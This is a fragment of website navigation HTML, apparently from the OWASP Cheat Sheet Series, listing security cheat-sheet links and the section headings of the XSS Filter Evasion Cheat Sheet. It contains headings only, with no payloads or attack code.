      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Symfony_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Symfony
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    TLS Cipher String
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Third Party Javascript Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Threat Modeling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transaction Authorization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transport Layer Protection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Transport_Layer_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transport Layer Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Unvalidated Redirects and Forwards
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    User Privacy Protection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Virtual Patching
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability Disclosure
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerable Dependency Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Service Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XML External Entity Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XML Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    XSS Filter Evasion
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="XSS_Filter_Evasion_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    XSS Filter Evasion
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tests" class="md-nav__link">
    <span class="md-ellipsis">
      Tests
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Tests">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#basic-xss-test-without-filter-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Basic XSS Test Without Filter Evasion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss-locator-polyglot" class="md-nav__link">
    <span class="md-ellipsis">
      XSS Locator (Polyglot)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malformed-a-tags" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed A Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malformed-img-tags" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed IMG Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fromcharcode" class="md-nav__link">
    <span class="md-ellipsis">
      fromCharCode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#default-src-tag-to-get-past-filters-that-check-src-domain" class="md-nav__link">
    <span class="md-ellipsis">
      Default SRC Tag to Get Past Filters that Check SRC Domain
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#default-src-tag-by-leaving-it-empty" class="md-nav__link">
    <span class="md-ellipsis">
      Default SRC Tag by Leaving it Empty
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#default-src-tag-by-leaving-it-out-entirely" class="md-nav__link">
    <span class="md-ellipsis">
      Default SRC Tag by Leaving it out Entirely
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#on-error-alert" class="md-nav__link">
    <span class="md-ellipsis">
      On Error Alert
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-onerror-and-javascript-alert-encode" class="md-nav__link">
    <span class="md-ellipsis">
      IMG onerror and JavaScript Alert Encode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decimal-html-character-references" class="md-nav__link">
    <span class="md-ellipsis">
      Decimal HTML Character References
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decimal-html-character-references-without-trailing-semicolons" class="md-nav__link">
    <span class="md-ellipsis">
      Decimal HTML Character References Without Trailing Semicolons
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hexadecimal-html-character-references-without-trailing-semicolons" class="md-nav__link">
    <span class="md-ellipsis">
      Hexadecimal HTML Character References Without Trailing Semicolons
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embedded-tab" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Tab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embedded-encoded-tab" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Encoded Tab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embedded-newline-to-break-up-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Newline to Break Up XSS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Embedded Newline to Break Up XSS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-1-break-up-xss-attack-with-embedded-carriage-return" class="md-nav__link">
    <span class="md-ellipsis">
      Example 1: Break Up XSS Attack with Embedded Carriage Return
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2-break-up-javascript-directive-with-null" class="md-nav__link">
    <span class="md-ellipsis">
      Example 2: Break Up JavaScript Directive with Null
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-4-non-alpha-non-digit-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Example 4: Non-alpha-non-digit XSS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extraneous-open-brackets" class="md-nav__link">
    <span class="md-ellipsis">
      Extraneous Open Brackets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-closing-script-tags" class="md-nav__link">
    <span class="md-ellipsis">
      No Closing Script Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#protocol-resolution-in-script-tags" class="md-nav__link">
    <span class="md-ellipsis">
      Protocol Resolution in Script Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#half-open-htmljavascript-xss-vector" class="md-nav__link">
    <span class="md-ellipsis">
      Half Open HTML/JavaScript XSS Vector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#escaping-javascript-escapes" class="md-nav__link">
    <span class="md-ellipsis">
      Escaping JavaScript Escapes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#end-title-tag" class="md-nav__link">
    <span class="md-ellipsis">
      End Title Tag
    </span>
  </a>
  
    <nav class="md-nav" aria-label="End Title Tag">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#input-image" class="md-nav__link">
    <span class="md-ellipsis">
      INPUT Image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#body-image" class="md-nav__link">
    <span class="md-ellipsis">
      BODY Image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-dynsrc" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Dynsrc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-lowsrc" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Lowsrc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-style-image" class="md-nav__link">
    <span class="md-ellipsis">
      List-style-image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vbscript-in-an-image" class="md-nav__link">
    <span class="md-ellipsis">
      VBscript in an Image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svg-object-tag" class="md-nav__link">
    <span class="md-ellipsis">
      SVG Object Tag
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ecmascript-6" class="md-nav__link">
    <span class="md-ellipsis">
      ECMAScript 6
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#body-tag" class="md-nav__link">
    <span class="md-ellipsis">
      BODY Tag
    </span>
  </a>
  
    <nav class="md-nav" aria-label="BODY Tag">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attacks-using-event-handlers" class="md-nav__link">
    <span class="md-ellipsis">
      Attacks Using Event Handlers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bgsound" class="md-nav__link">
    <span class="md-ellipsis">
      BGSOUND
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#javascript-includes" class="md-nav__link">
    <span class="md-ellipsis">
      &amp; JavaScript includes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE sheet
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-style-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      Remote style sheet
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Remote style sheet">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-style-sheet-part-2" class="md-nav__link">
    <span class="md-ellipsis">
      Remote style sheet part 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-style-sheet-part-3" class="md-nav__link">
    <span class="md-ellipsis">
      Remote style sheet part 3
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-tags-that-breaks-up-javascript-for-xss" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Tags that Breaks Up JavaScript for XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-attribute-that-breaks-up-an-expression" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Attribute that Breaks Up an Expression
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-style-with-expressions" class="md-nav__link">
    <span class="md-ellipsis">
      IMG STYLE with Expressions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-tag-using-background-image" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Tag using Background-image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-tag-using-background" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Tag using Background
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#anonymous-html-with-style-attribute" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous HTML with STYLE Attribute
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-htc-file" class="md-nav__link">
    <span class="md-ellipsis">
      Local htc File
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#us-ascii-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      US-ASCII Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#meta" class="md-nav__link">
    <span class="md-ellipsis">
      META
    </span>
  </a>
  
    <nav class="md-nav" aria-label="META">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#meta-using-data" class="md-nav__link">
    <span class="md-ellipsis">
      META using Data
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#meta-with-additional-url-parameter" class="md-nav__link">
    <span class="md-ellipsis">
      META with Additional URL Parameter
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iframe" class="md-nav__link">
    <span class="md-ellipsis">
      IFRAME
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iframe-event-based" class="md-nav__link">
    <span class="md-ellipsis">
      IFRAME Event Based
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#frame" class="md-nav__link">
    <span class="md-ellipsis">
      FRAME
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#table" class="md-nav__link">
    <span class="md-ellipsis">
      TABLE
    </span>
  </a>
  
    <nav class="md-nav" aria-label="TABLE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#td" class="md-nav__link">
    <span class="md-ellipsis">
      TD
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div" class="md-nav__link">
    <span class="md-ellipsis">
      DIV
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DIV">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#div-background-image" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Background-image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div-background-image-with-unicode-xss-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Background-image with Unicode XSS Exploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div-background-image-plus-extra-characters" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Background-image Plus Extra Characters
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div-expression" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Expression
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#downlevel-hidden-block" class="md-nav__link">
    <span class="md-ellipsis">
      Downlevel-Hidden Block
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#base-tag" class="md-nav__link">
    <span class="md-ellipsis">
      BASE Tag
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#object-tag" class="md-nav__link">
    <span class="md-ellipsis">
      OBJECT Tag
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embed-svg-which-contains-xss-vector" class="md-nav__link">
    <span class="md-ellipsis">
      EMBED SVG Which Contains XSS Vector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-data-island-with-cdata-obfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      XML Data Island with CDATA Obfuscation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" class="md-nav__link">
    <span class="md-ellipsis">
      Locally hosted XML with embedded JavaScript that is generated using an XML data island
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#htmltime-in-xml" class="md-nav__link">
    <span class="md-ellipsis">
      HTML+TIME in XML
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" class="md-nav__link">
    <span class="md-ellipsis">
      Assuming you can only fit in a few characters and it filters against .js
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssi-server-side-includes" class="md-nav__link">
    <span class="md-ellipsis">
      SSI (Server Side Includes)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-embedded-commands" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Embedded Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="IMG Embedded Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#img-embedded-commands-part-ii" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Embedded Commands part II
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cookie-manipulation" class="md-nav__link">
    <span class="md-ellipsis">
      Cookie Manipulation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss-using-html-quote-encapsulation" class="md-nav__link">
    <span class="md-ellipsis">
      XSS Using HTML Quote Encapsulation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-string-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      URL String Evasion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="URL String Evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ip-versus-hostname" class="md-nav__link">
    <span class="md-ellipsis">
      IP Versus Hostname
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      URL Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dword-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      DWORD Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hex-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Hex Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#octal-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Octal Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#base64-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Base64 Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mixed-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Mixed Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#protocol-resolution-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Protocol Resolution Bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removing-cnames" class="md-nav__link">
    <span class="md-ellipsis">
      Removing CNAMEs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#javascript-link-location" class="md-nav__link">
    <span class="md-ellipsis">
      JavaScript Link Location
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#content-replace-as-attack-vector" class="md-nav__link">
    <span class="md-ellipsis">
      Content Replace as Attack Vector
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assisting-xss-with-http-parameter-pollution" class="md-nav__link">
    <span class="md-ellipsis">
      Assisting XSS with HTTP Parameter Pollution
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Assisting XSS with HTTP Parameter Pollution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#content-page-source-code" class="md-nav__link">
    <span class="md-ellipsis">
      Content Page Source Code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#share-page-source-code" class="md-nav__link">
    <span class="md-ellipsis">
      Share Page Source Code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#content-page-output" class="md-nav__link">
    <span class="md-ellipsis">
      Content Page Output
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#share-page-output" class="md-nav__link">
    <span class="md-ellipsis">
      Share Page Output
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#character-escape-sequences" class="md-nav__link">
    <span class="md-ellipsis">
      Character Escape Sequences
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#methods-to-bypass-waf-cross-site-scripting" class="md-nav__link">
    <span class="md-ellipsis">
      Methods to Bypass WAF  Cross-Site Scripting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Methods to Bypass WAF  Cross-Site Scripting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-issues" class="md-nav__link">
    <span class="md-ellipsis">
      General issues
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General issues">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#stored-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Stored XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reflected-xss-in-javascript" class="md-nav__link">
    <span class="md-ellipsis">
      Reflected XSS in JavaScript
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dom-based-xss" class="md-nav__link">
    <span class="md-ellipsis">
      DOM-based XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss-via-request-redirection" class="md-nav__link">
    <span class="md-ellipsis">
      XSS via request Redirection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#waf-bypass-strings-for-xss" class="md-nav__link">
    <span class="md-ellipsis">
      WAF ByPass Strings for XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filter-bypass-alert-obfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      Filter Bypass Alert Obfuscation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="XS_Leaks_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XS Leaks
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tests" class="md-nav__link">
    <span class="md-ellipsis">
      Tests
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Tests">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#basic-xss-test-without-filter-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Basic XSS Test Without Filter Evasion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss-locator-polyglot" class="md-nav__link">
    <span class="md-ellipsis">
      XSS Locator (Polyglot)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malformed-a-tags" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed A Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malformed-img-tags" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed IMG Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fromcharcode" class="md-nav__link">
    <span class="md-ellipsis">
      fromCharCode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#default-src-tag-to-get-past-filters-that-check-src-domain" class="md-nav__link">
    <span class="md-ellipsis">
      Default SRC Tag to Get Past Filters that Check SRC Domain
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#default-src-tag-by-leaving-it-empty" class="md-nav__link">
    <span class="md-ellipsis">
      Default SRC Tag by Leaving it Empty
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#default-src-tag-by-leaving-it-out-entirely" class="md-nav__link">
    <span class="md-ellipsis">
      Default SRC Tag by Leaving it out Entirely
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#on-error-alert" class="md-nav__link">
    <span class="md-ellipsis">
      On Error Alert
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-onerror-and-javascript-alert-encode" class="md-nav__link">
    <span class="md-ellipsis">
      IMG onerror and JavaScript Alert Encode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decimal-html-character-references" class="md-nav__link">
    <span class="md-ellipsis">
      Decimal HTML Character References
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decimal-html-character-references-without-trailing-semicolons" class="md-nav__link">
    <span class="md-ellipsis">
      Decimal HTML Character References Without Trailing Semicolons
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hexadecimal-html-character-references-without-trailing-semicolons" class="md-nav__link">
    <span class="md-ellipsis">
      Hexadecimal HTML Character References Without Trailing Semicolons
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embedded-tab" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Tab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embedded-encoded-tab" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Encoded Tab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embedded-newline-to-break-up-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Newline to Break Up XSS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Embedded Newline to Break Up XSS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-1-break-up-xss-attack-with-embedded-carriage-return" class="md-nav__link">
    <span class="md-ellipsis">
      Example 1: Break Up XSS Attack with Embedded Carriage Return
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2-break-up-javascript-directive-with-null" class="md-nav__link">
    <span class="md-ellipsis">
      Example 2: Break Up JavaScript Directive with Null
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-4-non-alpha-non-digit-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Example 4: Non-alpha-non-digit XSS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extraneous-open-brackets" class="md-nav__link">
    <span class="md-ellipsis">
      Extraneous Open Brackets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-closing-script-tags" class="md-nav__link">
    <span class="md-ellipsis">
      No Closing Script Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#protocol-resolution-in-script-tags" class="md-nav__link">
    <span class="md-ellipsis">
      Protocol Resolution in Script Tags
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#half-open-htmljavascript-xss-vector" class="md-nav__link">
    <span class="md-ellipsis">
      Half Open HTML/JavaScript XSS Vector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#escaping-javascript-escapes" class="md-nav__link">
    <span class="md-ellipsis">
      Escaping JavaScript Escapes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#end-title-tag" class="md-nav__link">
    <span class="md-ellipsis">
      End Title Tag
    </span>
  </a>
  
    <nav class="md-nav" aria-label="End Title Tag">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#input-image" class="md-nav__link">
    <span class="md-ellipsis">
      INPUT Image
    </span>
  </a>
  
</li>
        
